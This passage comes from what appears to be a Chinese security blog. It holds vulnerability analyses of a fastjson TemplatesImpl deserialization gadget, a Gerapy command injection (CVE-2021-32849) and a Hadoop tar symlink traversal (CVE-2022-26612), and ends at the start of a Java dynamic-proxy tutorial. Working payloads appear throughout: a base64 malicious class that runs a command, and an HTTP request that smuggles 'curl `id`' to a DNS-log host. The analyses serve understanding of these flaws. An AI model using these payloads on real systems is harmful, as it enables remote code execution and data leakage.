W9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>@type 表示需要将给字符串反序列化为什么类型</li>
<li>_bytecodes 就是执行命令的payload，其实就是</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>转换为字节码再进行base64编码</p>
<ul>
<li>_name </li>
<li>_tfactory</li>
<li>_outputProperties ，这就是我们的漏洞入口了，因为在反序列化过程中调用了该属性的getter方法，即getOutputProperties方法。</li>
</ul>
<p>接下来我们跟踪一下这个方法。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f7a1b4cb0394e0312665e69c8aa17559.png" alt="在这里插入图片描述"><br>调用了newTransformer方法，跟进：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a940036dea76980597a5d109b591486b.png" alt="在这里插入图片描述"></p>
<p>调用getTransletInstance方法，跟进：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/18825b7b412709fa4a714e7676637a18.png" alt="在这里插入图片描述"><br>这里对_name的值进行了判断，不能为空，为空直接return了，而_name的默认值为空：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/dee7b98cf6f97d60ac4fd613d2dddfcd.png" alt="在这里插入图片描述"><br>所以我们构造poc的时候需要为_name赋值。<br>然后要保证_class为null，刚好其默认值就位null，所以我们不用管他，然后就执行了defineTransletClasses方法，这里出现了defineClass类似的关键字，我第一反应就是Java类加载时的defineClass方法，将字节码装换为一个Class实例。想来这各函数和defineClass函数功能一样，我们继续往下看，到了这一步：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e7d839663b4709b41f3c71a44141481c.png" alt="在这里插入图片描述"><br>调用了getConstructor方法然后继续调用了newInstance方法，这是什么？这是通过反射调用构造方法实例化一个对象啊，那么我们只需要将我们的恶意代码卸载恶意类的构造方法里面就好了。这时候就回到了_class[_transletIndex]的值得为一个Class实例对象。且该实例化对象代表的类继承了AbstractTranslet类，因为这儿有个强制类型转换。那么这个_class[_transletIndex]从哪来<br>呢。我们跟进defineTransletClasses方法。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4eeedc02d3106571d951b121eef661da.png" alt="在这里插入图片描述"><br>首先判断了_bytecodes是否为空，这当然是不能为空的了，因为我们会控制他的值，所以接下来流程往下走加载了一个loader，是一个自定义的类加载器，里面应该重写了findclass方法实现了自己的类加载方法，接着往下计算了_bytecodes的长度为classCount，不出意外这里等于1。然后new了一个Class数组赋值给_class。然后判断classCount的值是否大于1，当然是不大于了，然后进入for循环，把第一个字节数据取出来调用defineClass方法生成一个Class实例对象。然后获取该Class对象的父类，判断其是否等于ABSTRACT_TRANSLET，这个常量的值我们跟一下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/37cde3d936f2a5017a4c3d0c9a1b4f26.png" alt="在这里插入图片描述"><br>正好是AbstractTranslet类，和我们上面分析的一致，我们需要让我们的恶意类集成AbstractTranslet类。然后为_transleetIndex复赋值为0。defineTranslet调用完毕后就是实例化对象执行构造方法了。</p>
<p>但是这里有一个疑问，我们传给_bytecodes的代码是base64编码的，那么在执行过程中，肯定有哪一步实现了解码的操作，这个我们要从头开始看。<br>我们的poc中使用的反序列化函数是这个：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2506c24576472c96e0251e20ebe6eb1e.png" alt="在这里插入图片描述"><br>其中jsonString就是我们穿进去的payload，我们跟一下这个parseObject方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f063a10dc4a3a989c771b7202d472fe8.png" alt="在这里插入图片描述"><br>调用了重载方法，继续跟：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/21be525054f6eacbb38b83131c73b952.png" alt="在这里插入图片描述"></p>
<p>跟到了这里注意有两个关键的地方，一个是第一个箭头处生成了一个JSON解析器对象，一个是第二个箭头处调用的parseObject方法，我们先跟第二个箭头：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/679d84dab4f64ffc90b42c06ba0f635b.png" alt="在这里插入图片描述"><br>进去后看到又一个token的判断，这个后面再将，最后到调用getDeserializer方法，获取一个反序列化器，然后调用其deerialze方法，跟到方法里面：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a08f58da592247915b64ee616dfc21e6.png" alt="在这里插入图片描述"><br>注意到最后return处的三元运算符，判断type是否为Class实例，并且不是Object.Class实例，并且不是Serializable.Class实例，这个判断为否，所以最后执行了parser.parser方法，跟进去：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e464c93696f3b3b0857384cd5d1f3be5.png" alt="在这里插入图片描述"><br>这里有大块的语句对lexer.token的值尽心判断，那么这个值为多少呢？我们需要回到前面的步骤：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a4c70ef479481c8497a1ad8c5093c84c.png" alt="在这里插入图片描述"><br>跟进这个新建解析器的操作：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/97befd5b67a280e376c3346558e06c0c.png" alt="在这里插入图片描述"><br>调用了构造方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4fb8bbf9a4cbf45602511d6cfac43106.png" alt="在这里插入图片描述"><br>this.lexer在这儿被赋值，形参lexer是一个JSONScanner对象由上一步传进来。然后执行lexer.getcurrent方法，看看他干了什么：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f42e03f693cc4efbfc16f5b6fb6bdd48.png" alt="在这里插入图片描述"><br>反回了this.ch的值，这个值当前为{ 看看这个值怎么获取的，该值是在创建JSONScanner对象时再构造方法中赋值的，跟进去：</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/afe015a247f576402a14867fe2a58e19.png" alt="在这里插入图片描述"><br>继续跟到this.next里面:<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7e721ed2548ac42df0d2e96570444dfd.png" alt="在这里插入图片描述"><br>这里看到有一个三元运算符，如果当前的index大于this.len则为this.ch赋值为\u001a，否则计算this.text在index处的字符赋值给this.ch。this.len 与 this.text在上一级函数赋值，分别为input与input的长度，而input就是我们的输入的pauload。所以最开始获取到的this.ch为 { 后面每调用一次this.getcurrent就是调用一次this.next获取下一个字符的值，这时候我们返回到getcurrent的调用处：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ecb5ba3b4262d1036a53ec92d6d5357f.png" alt="在这里插入图片描述"></p>
<p>ch &#x3D;&#x3D;‘{’成立，然后获取下一个字符，并把token设置为12。<br>以上就是token的由来，然后我们回到parse函数，找到case 12：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c80db5f1bc10df5d5d7b112bb9ab0636.png" alt="在这里插入图片描述"><br>跟到this.parseObject里面：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6b132329d9a05c2df08cc4e075cc9b67.png" alt="在这里插入图片描述"><br>一步步调试最后到了第二个红箭头处，判断第二个ch是否为” ,当然是的，我们让调试过程强制跳转到第176行：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3d5c85e5f6fbb39267499e1d386e64da.png" alt="在这里插入图片描述"><br>这里获取了key的值，但是我们不知道是多少，再前进一步：</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/419ec316e45994ee75282e83ef275758.png" alt="在这里插入图片描述"><br>这不就有了吗，key就是@type，继续单步往下走就到了这儿：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/23da7cbb241829c5c2aaca5ca2465275.png" alt="在这里插入图片描述"><br>判断key是否等于JSON.DEFAULT_TYPE_KEY，看看这个常量是多少：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1e01dda8b1c061a4fce244eaab0bb788.png" alt="在这里插入图片描述"><br>证明是相等的。第二个条件就不跟了。然后进入到if判断里面获取了ref，走到他的下一步看看ref等于多少，不幸的是，调试的时候没看到，那只能去看看lexer.scanSymbol干了什么了，这个和获取key值得方法一样，我猜就是获取@type的值：<br>没跟到，哈哈尴尬！！！！！直接跳过，范湖IDE就是@type的值：<br>然后就调用了loadClass函数，这个…..，不就是要准备加载类了吗，我们进去看看：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/13c3654464cee3c403c0a1227a229ffe.png" alt="在这里插入图片描述"><br>果然，第一个参数是类名，第二个参数是类加载器，我们传进来的是默认类加载器也就是系统类加载器。首先判断clazz是否为空，当然不为空，然后判断类名第一个字符是否是[，当然也不是，然后判断是否以L开头，当然也不是，都不是之后判断类加载器是否为空，当然不是，然后调用系统类加载器的loadClass方法加载了我们的恶意TemplataImpl类并返回。到这里我们就获得了TemplateImpl类的Class实例对象了。然后就是通过反射机制获得类名、字段之类的一系列值了。然后单步向下来到这里：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9f73cac0c741f9b7a555c7727aa9890f.png" alt="在这里插入图片描述"><br>跟进去：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/54fc5f878379efa07b945d4ab82e8366.png" alt="在这里插入图片描述"></p>
<p>调用重载方法，继续跟：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c6b127bec0b43f2432ab9716db80349a.png" alt="在这里插入图片描述"><br>还是重载，继续：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0b6053e5d2e6ba965c51337978ba4982.png" alt="在这里插入图片描述"><br>然后来到了这里，单步向下到这里：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/dfc7531499a7428d38c9c68857ed7f7d.png" alt="在这里插入图片描述"></p>
<p>到367行已经获取到了outputProperities的值了<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b72d99e660b80bcfe797a6e6b73468cc.png" alt="在这里插入图片描述"><br>看看他怎么来的，最后定位到底63行，在构造方法中被赋值：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/62a76338ff33d2d8182905a2475a49ce.png" alt="在这里插入图片描述"><br>那就看看在哪创建的吧，返回到上一层，当然是在这儿：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d1342d5949c6380b5bfdc33abfabcb23.png" alt="在这里插入图片描述"><br>进到getDeserializer方法里面：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/84d5091d7fb87ddd235d21d8ee9fa7b2.png" alt="在这里插入图片描述"><br>跟进这一步，单步到这儿：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3a3a70dd76788ffe1f9496e814d1c5da.png" alt="在这里插入图片描述"><br>继续跟进去，定位到这儿：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5a3b8cb3c6aadb5a6cccbff31a0be4e9.png" alt="在这里插入图片描述"><br>继续跟进去：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6e91952f5d4c63dcada2109957040447.png" alt="在这里插入图片描述"></p>
<p>这里获取了所有的属性与方法，继续向下到这儿：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/50f3c6e52debaacd230984e5f166a384.png" alt="在这里插入图片描述"><br>判断方法名是否长度大于4，因为有get与set嘛，不能是静态方法，返回值不能为void，或者返回值为自身的类，继续向下判断是否set开头。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/16fef496cf1fc4b119efb2eb7b3b668a.png" alt="在这里插入图片描述"><br>这个最后有一个add方法获得了所有的属性放到fieldList里面<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7f7989d251cb1a7d61acc64a89fa6735.png" alt="在这里插入图片描述"><br>通过同样的方法获得get方法的属性：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7b646c4806f06aad7cfadc5270791a03.png" alt="在这里插入图片描述"><br>最终返回一个JavaBeanInfo对象，里面就有outputProperties则值了：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ec5fcba7df48c9af84f46331892f8dc4.png" alt="在这里插入图片描述"><br>然后继续向下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/dca9c0ffd21e2e2c7835c0d0c2cb313d.png" alt="在这里插入图片描述"><br>跟进去：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ae9ee75446203cd8576d24a42b85704e.png" alt="在这里插入图片描述"><br>继续跟：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a0d24d9b5d3bf931ef0b112c6bce3570.png" alt="在这里插入图片描述"><br>到这儿后，判断_bytecodes第一个字符是不是_，如果是则替换为空，到最后返回一个fieldDeserializer：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/822d25190bc4b113d757a827db2f4e4b.png" alt="在这里插入图片描述"><br>执行完后到这儿，反正我是没有跳过去：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d3215dd01bbd53746fc3e26adf1b66cd.png" alt="在这里插入图片描述"></p>
<p>进去：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/da541b6fc0351c2fccfda9e480cb0b7d.png" alt="在这里插入图片描述"></p>
<p>这儿实例化了一个对象，会调用构造方法，跟进去就到了这里：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/74de1d2ca82ad454088850b963d7ff36.png" alt="在这里插入图片描述"><br>后面的过程就和我们开始的分析一样了，完整的调用栈：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a35f9036a8fd9caeeb4c5e8b3f1d88cd.png" alt="在这里插入图片描述"><br>说道这里还是没有讲为什么要base64编码，也是原作者锅，狗头保命。当token等于4的时候，会调用lexer.bytesValue<br><img src="https://i-blog.csdnimg.cn/blog_migrate/432d562f7dec5775315372382631e7fc.png" alt="在这里插入图片描述"><br>我们知道lexer对象是通过JSONScanner生成的，所以我们要到JSONScanner类里面去找bytesValue：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/930a4b463d3a7cd04ca8c2fc6c8a8d58.png" alt="在这里插入图片描述"><br>这里调用了base64的解码函数。<br>最后跟的有点水，因为我也有点没有跟明白！！！！</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>fastjson</tag>
        <tag>gadgets</tag>
        <tag>templateImpl</tag>
      </tags>
  </entry>
  <entry>
    <title>Gerapy clone 后台远程命令执行漏洞【CVE-2021-32849】</title>
    <url>/archives/9d7d8426.html</url>
    <content><![CDATA[<p>@[TOC](Gerapy clone 后台远程命令执行漏洞【CVE-2021-32849】)</p>
<p>该漏洞的利用需要授权，虽然危害较大，但是感觉还是比较鸡肋的。<br>项目地址：<a href="https://github.com/Gerapy/Gerapy">Gerapy</a><br>该漏洞出现在项目的<code>gerapy/server/core/views.py</code>中的<code>project_clone</code>函数中：</p>
<span id="more"></span>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9eb4aefb4396f43fdf3008db2f01d093.png" alt="在这里插入图片描述"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@api_view(<span class="params">[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@permission_classes(<span class="params">[IsAuthenticated]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">project_clone</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    clone project from github</span></span><br><span class="line"><span class="string">    :param request: request object</span></span><br><span class="line"><span class="string">    :return: json</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        data = json.loads(request.body)</span><br><span class="line">        address = data.get(<span class="string">&#x27;address&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> address.startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">        address = address + <span class="string">&#x27;.git&#x27;</span> <span class="keyword">if</span> <span class="keyword">not</span> address.endswith(<span class="string">&#x27;.git&#x27;</span>) <span class="keyword">else</span> address</span><br><span class="line">        cmd = <span class="string">&#x27;git clone &#123;address&#125; &#123;target&#125;&#x27;</span>.<span class="built_in">format</span>(address=address, target=join(PROJECTS_FOLDER, Path(address).stem))</span><br><span class="line">        logger.debug(<span class="string">&#x27;clone cmd %s&#x27;</span>, cmd)</span><br><span class="line">        p = Popen(cmd, shell=<span class="literal">True</span>, stdin=PIPE, stdout=PIPE, stderr=PIPE)</span><br><span class="line">        stdout, stderr = bytes2str(p.stdout.read()), bytes2str(p.stderr.read())</span><br><span class="line">        logger.debug(<span class="string">&#x27;clone run result %s&#x27;</span>, stdout)</span><br><span class="line">        <span class="keyword">if</span> stderr: logger.error(stderr)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="literal">True</span>&#125;) <span class="keyword">if</span> <span class="keyword">not</span> stderr <span class="keyword">else</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注意到第339行使用了Popen函数，搜一下这个函数的作用：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/799f6635745b9e6dfc81b445ddb3b5f2.png" alt="在这里插入图片描述"></p>
<p>说白了可以用来执行系统命令，我们来验证一下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5d258bd7ccdbd60712f869e1848ed6be.png" alt="在这里插入图片描述"><br>成功弹出来了计算器。<br>所以如果cmd参数可控，那么就可以用来执行系统命令，<br>cmd的赋值操作：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd = <span class="string">&#x27;git clone &#123;address&#125; &#123;target&#125;&#x27;</span>.<span class="built_in">format</span>(address=address, target=join(PROJECTS_FOLDER, Path(address).stem))</span><br></pre></td></tr></table></figure>
<p>address或者target可控就可以执行命令<br>address的赋值操作：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3fc852ebbd311913f9e1987b778fb0d7.png" alt="在这里插入图片描述"><br>观察这一串代码，首先将请求体的数据加载为python字典，然后获取其中address键的值赋值给address，同时还要满足address的值以http开头，否则就直接退出程序了。最后将address拼接.git赋值个address。从这个过程可以看到，address的值是我们完全可控的，也就意味着我们可以用来执行系统命令。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /api/project/clone HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">Content-Length: 61</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;address&quot;:&quot;http://127.0.0.1;curl `id`.rwbmny.dnslog.cn&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>访问的api信息在这儿：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/01e29197029a0735c2b4675d5678692a.png" alt="在这里插入图片描述"><br>不幸的是，这个操作需要认证，看到请求头中的Authorization标头了吗，无语凝噎：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e8b49ac4d5289c12a97c47bd7c7b0e98.png" alt="在这里插入图片描述"><br>顺着这个思路其实还有一系列的利用链条，有兴趣的可以自行下载源码审计。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Gerapy clone</tag>
        <tag>CVE-2021-32849</tag>
        <tag>远程命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Hadoop 任意文件写入【CVE-2022-26612】</title>
    <url>/archives/faaa9881.html</url>
    <content><![CDATA[<p>来源</p>
<blockquote>
<p><a href="https://securitylab.github.com/advisories/GHSL-2022-012_Apache_Hadoop/">https://securitylab.github.com/advisories/GHSL-2022-012_Apache_Hadoop&#x2F;</a></p>
</blockquote>
<p>这个洞吧，你以为很厉害吧其实在我目前掌握的情况来看啥也不是，说要有<code>hadoop</code>环境吧，后来发现根本不需要，还浪费我好多时间在<code>windows</code>上安装<code>hadoop</code>踩坑。</p>
<span id="more"></span>
<p>大概的一是就是将<code>hadoop</code>的<code>FileUtil.java</code>这个类的<code>unTar</code>函数在调用<code>unTarUsingJava</code>函数对<code>tar</code>包进行解压的时候如果<code>tar</code>包中的文件是个软链接，那么将可能导致目录穿越从而使得这个软链接链接到任意的位置。当然看到这里的函数命名为使用<code>Java</code>解压，那么肯定还有使用命令解压的，当然这不是我们的讨论重点。而最终的核心逻辑则是在<code>unpackEntries</code>这个函数中,下面我们一起来看看这个过程，这里我首先写了一个简单的利用脚本<br><img src="https://i-blog.csdnimg.cn/blog_migrate/80da18b8e9ee1cb6262204773d7975b4.png" alt="在这里插入图片描述"><br>毫无疑问，你需要一些依赖<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1d99fc6fb4c9f82adfb3ac50c82ed386.png" alt="在这里插入图片描述"><br>注意到这里使用的版本是3.2.0，当然其实用不了这么多依赖的，最主要的是hdfs的依赖，我也懒得删了。然后我么来看看最新的补丁长啥样<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b9690db34502a8e5d4469917b9d82c61.png" alt="在这里插入图片描述"><br>很明显原始的存在漏洞的代码为途中红色区域，这段代码首先调用<code>isSymbolicLink</code>函数判断entry是否为符号链接，如果是的话则调用<code>createSymbolicLink</code>函数创建一个符号链接，该函数有两个参数，第一个参数为要创建的符号链接的位置，第二个为符号链接指向的文件，看看这两参数怎么赋值的，分别为<code>FileSystems.getDefault().getPath(outputDir.getPath(), entry.getName())</code>与<code>FileSystems.getDefault().getPath(entry.getLinkName())</code> 这里面有三个重点的参数一个是<code>outputDir.getPath</code>一个是<code>entry.getName</code>另一个是<code>entry.getLinkName</code>很明显第一个是获取<code>unTar</code>传入的目标路径，第二是是获取tar包中软链接文件的文件名，第三个是获取软链接指向的文件名。这三个参数都有被控制的可能，主要看目标代码怎么写了。当然第一个参数一般不会有程序员写的让你可控的，那么能做手脚的就只剩下第二个和第三个参数了，如果我们需要将软链接创建到启动目录里面去，那么就要控制第二个参数，但是在windows环境中文件名是不能出现/类的特殊字符的，所以这条路也就被堵死了。那么就只能想办法搞定第三个参数，当然这个参数是可控的。我们只需要在创建软链接的时候使用相对路径就可以了<br><img src="https://i-blog.csdnimg.cn/blog_migrate/143d924024c0f5e634f1c0bfcf03090c.png" alt="在这里插入图片描述"><br>所以利用的方式也就很明显了，首先我们按照上面的方式创建一个软链接，然后使用打包工具将这个软链接打包为一个tar包，然后调用FileUtil.java#unTar函数对该tar包进行解压就好了。在对软链接进行打包的时候不要使用linux命令打包，遇到了坑，可以选用7zip，打包的时候注意选择压缩格式以及勾选保存符号链接复选框，不然是会失败的哦。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/78620defd00475443302962f177fcdfd.png" alt="在这里插入图片描述"></p>
<p>所以看到这里你还觉得这个漏洞很有用吗？</p>
<p>当然具体的调用过程，可以自己用IDEA调试一下，这里注意IDEA要使用管理员权限启动，不然是不能创建符号链接的。<br>当然，如果你的windows没有hadoop环境，在执行测试样例的时候可能会报错，但并不影响最终的结果，如果你想完美无缺，你必须安装hadoop并配置环境变量</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>任意文件写</tag>
        <tag>hadoop</tag>
        <tag>CVE-2022-26612</tag>
      </tags>
  </entry>
  <entry>
    <title>Hadoop Yarn RPC 未授权远程代码执行漏洞复现</title>
    <url>/archives/fe9d893.html</url>
    <content><![CDATA[<p>@[TOC](Hadoop Yarn RPC未授权远程代码执行漏洞复现)</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/3ab30941cdeba7e45e3144e8bab166aa.png" alt="在这里插入图片描述"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/22c1f14442ae999cd5642a84e344b9b8.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>远程代码执行</tag>
        <tag>Hadoop</tag>
        <tag>Yarn</tag>
        <tag>RPC</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA动态代理代码梳理</title>
    <url>/archives/d38cd4a6.html</url>
    <content><![CDATA[<p>当我们要为我们的代码附加别的功能的时候，我们往往写一个代理类来实现对当前类的封装，该代理类不实现具体的代码逻辑，只是提供了额外的功能，但如果我有很多的类需要封装一样的功能，那么我就得写很多的代理类，这种方式耗时严重且不易维护，是极为不可取的。所以JAVA为我们提供了动态代理的方式来一劳永逸，貌似大名鼎鼎的AOP就是通过动态代理的方式实现的，那我们来写一个动态代理的例子。</p>
<span id="more"></span>
<p>首先我们需要一个接口，作为被代理类的接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.dynamicproxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ProxyInterface</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printName</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后定义一个实现类</p>
